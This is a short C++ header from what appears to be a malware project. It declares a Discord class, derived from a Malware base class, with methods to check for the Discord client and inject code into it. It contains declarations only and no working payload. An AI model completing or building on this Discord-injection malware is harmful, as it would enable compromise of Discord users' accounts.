#pragma once
#ifndef DISCORD_HPP
#define DISCORD_HPP

#include "Malware.hpp"

/*
    Discord class
    @file Discord.hpp
    @author miaouCorp
    @version 1.0
*/

class Discord : public Malware 
{
    private:
        bool DiscordInstalled{ false };
        bool InjectionWrited{ false };

    public:
        bool checkDiscord();
        bool injectDiscord();
        bool isInjectionWrited() const;
        bool isDiscordInstalled() const;
};

#endif